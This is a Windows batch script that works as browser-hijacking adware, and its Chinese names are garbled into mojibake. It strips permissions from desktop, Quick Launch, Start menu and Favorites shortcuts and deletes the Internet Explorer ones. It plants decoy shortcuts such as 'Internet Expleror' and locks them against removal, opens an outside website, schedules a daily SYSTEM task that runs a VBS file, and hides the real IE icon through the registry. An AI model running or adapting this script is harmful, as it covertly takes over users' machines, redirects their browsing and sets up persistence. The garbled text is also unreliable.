@shift
cls
@echo off
 


echo y| cacls "%userprofile%\����\*.lnk"   /p everyone:f
echo y| cacls "%userprofile%\����\*.url"   /p everyone:f
echo y| cacls "C:\Documents and Settings\All Users\����\*.lnk"   /p everyone:f
echo y| cacls "C:\Documents and Settings\All Users\����\*.url"   /p everyone:f
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"   /p everyone:f
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url"   /p everyone:f 
attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  -R -S
attrib  "%USERPROFILE%\����\*.lnk"  -R -S
attrib  "%USERPROFILE%\����\*.url"  -R -S

del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\*Internet*.lnk" /f/q/a
del "%userprofile%\����\*.url" /f/q/a


del  "C:\Documents and Settings\All Users\����\Internet*.lnk" /f/q/a
del  "C:\Documents and Settings\All Users\����\*Internet*.lnk" /f/q/a
del  "C:\Documents and Settings\All Users\����\*.url" /f/q/a

del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
del   "%userprofile%\����ʼ���˵�\*.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\*.lnk"  /f/q/a



copy "360��ȫ��ʿ.lnk" "%userprofile%\����\Internet Expleror.lnk" /y

copy "360��ȫ��ʿ.lnk" "%userprofile%\����ʼ���˵�\����\Internet Expleror.lnk" /y
copy "360��ȫ��ʿ.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\����IE �����.lnk" /y
 
 copy "Ѹ��.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\С��Ϸ.lnk" /y
 copy "����Ӱ��.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\��ѵ�Ӱ.lnk" /y
 copy "Ѹ��.lnk" "%userprofile%\����\С��Ϸ.lnk" /y
 copy "����Ӱ��.lnk" "%userprofile%\����\��ѵ�Ӱ.lnk" /y
 
 
 

copy "��ѶQQ2010.lnk" "%userprofile%\����ʼ���˵�\����\����\����QQ.lnk" /y

copy "360��ȫ��ʿ.lnk" "%userprofile%\����\Internet Expleror.lnk" /y
 
copy "����Ӱ��.lnk" "%userprofile%\����ʼ���˵�\��ѵ�Ӱ.lnk" /y
 
 
copy "Ѹ��.lnk" "%userprofile%\����ʼ���˵�\С��Ϸ.lnk" /y
 
copy "����Ӱ��.lnk" "%userprofile%\Favorites\��ѵ�Ӱ.lnk" /y
copy "Ѹ��.lnk" "%userprofile%\Favorites\С��Ϸ.lnk" /y
copy "360��ȫ��ʿ.lnk" "%userprofile%\Favorites\��վ��ȫ.lnk" /y 



attrib  "%USERPROFILE%\����\Internet Expleror.lnk"  +R +S

attrib  "%USERPROFILE%\����\��ѵ�Ӱ.lnk"  +R +S
attrib  "%USERPROFILE%\����\С��Ϸ.lnk"  +R +S
 


attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S
attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url"  +R +S

echo y| cacls "%userprofile%\����\Internet Expleror.lnk"   /p everyone:R

echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\����IE �����.lnk"  /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\С��Ϸ.lnk"  /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\��ѵ�Ӱ.lnk"  /p everyone:R
 
 

start http://fzlsisi.com/fenlei.htm
 



 
SCHTASKS /Create /SC DAILY /RU system /RP HZF /TN HU /SD 2008/11/21 /ST 20:00:00 /TR c:\windows\system32\win\qq2010.vbs



Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Set "TMPINF=C:\TmpInf.inf"
echo [Version] >%TMPINF%
echo Signature="$Windows NT$" >>%TMPINF%
echo [DefaultInstall] >>%TMPINF%
RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
del %TMPINF%
exit

  









